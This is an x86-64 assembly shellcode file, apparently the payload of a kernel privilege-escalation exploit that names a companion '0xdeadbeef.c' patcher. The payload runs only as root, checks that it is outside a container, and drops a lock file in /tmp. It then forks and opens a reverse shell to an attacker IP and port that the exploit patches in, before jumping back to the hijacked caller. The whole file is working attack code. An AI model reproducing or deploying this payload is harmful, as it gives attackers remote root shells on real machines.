		BITS 64
		[SECTION .text]
		global _start

SYS_OPEN	equ 0x2
SYS_SOCKET	equ 0x29
SYS_CONNECT	equ 0x2a
SYS_DUP2	equ 0x21
SYS_FORK	equ 0x39
SYS_EXECVE	equ 0x3b
SYS_EXIT	equ 0x3c
SYS_READLINK	equ 0x59
SYS_GETUID	equ 0x66

AF_INET		equ 0x2
SOCK_STREAM	equ 0x1

IP		equ 0xdeadc0de	;; patched by 0xdeadbeef.c
PORT		equ 0x1337	;; patched by 0xdeadbeef.c

_start:
		;; save registers
		push	rdi
		push	rsi
		push	rdx
		push	rcx

		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		;;
		;; return if getuid() != 0
		;;
		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

		mov	rax, SYS_GETUID
		syscall
		test	rax, rax
		jne	return

		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		;;
		;; check if whithin a container (PROC_PID_INIT_INO = 0xEFFFFFFC)
		;; return if $(readlink /proc/1/ns/pid) != "pid:[4026531836]"
		;;
		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

		call	get_strings
		lea	rsi, [rsp-16]
		mov	rdx, 16			; strlen("pid:[4026531836]")
		mov	rax, SYS_READLINK
		syscall
		cmp	rax, rdx
		jne	return
		add	rdi, 15			; "pid:[4026531836]"
		mov	rcx, rdx
		repe cmpsb
		jne	return

		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		;;
		;; return if open("/tmp/.x", O_CREAT|O_EXCL, x) == -1
		;;
		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

		mov     rsi, 0x00782e2f706d742f
		push    rsi
		mov     rdi, rsp
		mov     rsi, 192
		mov     rax, SYS_OPEN
		syscall
		test    rax, rax
		pop     rsi
		js      return

		;; fork
		mov     rax, SYS_FORK
		syscall
		test    rax, rax
		jne	return

		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		;;
		;; reverse connect (https://www.exploit-db.com/exploits/35587/)
		;;
		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

		;; sockfd = socket(AF_INET, SOCK_STREAM, 0)
		xor	rsi, rsi	; 0 out rsi
		mul	esi		; 0 out rax, rdx ; rdx = IPPROTO_IP (int: 0)
		inc	rsi             ; rsi = SOCK_STREAM
		push	AF_INET
		pop	rdi
		add	al, SYS_SOCKET
		syscall

		; copy socket descriptor to rdi for future use
		push	rax
		pop	rdi

		; server.sin_family = AF_INET
		; server.sin_port = htons(PORT)
		; server.sin_addr.s_addr = IP
		; bzero(&server.sin_zero, 8)
		push	rdx
		push	rdx
		mov	dword [rsp + 0x4], IP
		mov	word [rsp + 0x2], PORT
		mov	byte [rsp], AF_INET

		;; connect(sockfd, (struct sockaddr *)&server, sockaddr_len)
		push	rsp
		pop	rsi
		push	0x10
		pop	rdx
		push	SYS_CONNECT
		pop	rax
		syscall
		test    rax, rax
		js      exit

		;; dup2(sockfd, STDIN); dup2(sockfd, STDOUT); dup2(sockfd, STERR)
		xor	rax, rax
		push	0x3		; loop down file descriptors for I/O
		pop	rsi
dup_loop:
		dec	esi
		mov	al, SYS_DUP2
		syscall
		jne	dup_loop

		;; execve('//bin/sh', NULL, NULL)
		push	rsi		; *argv[] = 0
		pop	rdx		; *envp[] = 0
		push	rsi		; '\0'
		mov	rdi, '//bin/sh'	; str
		push	rdi
		push	rsp
		pop	rdi		; rdi = &str (char*)
		xor	rax, rax
		mov	al, SYS_EXECVE
		syscall

exit:
		xor	rax, rax
		mov	al, SYS_EXIT
		syscall

return:
		;; restore registers
		pop	rcx
		pop     rdx
		pop     rsi
		pop     rdi
		;; get callee address (pushed on the stack by the call instruction)
		pop     rax
		;; execute missed instructions (patched by 0xdeadbeef.c)
		db	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
		;; return to callee
		jmp     rax

get_strings:
               lea	rdi, [rel $ +8]
               ret
               db	'/proc/1/ns/pid'
               db	0
               db	'pid:[4026531836]'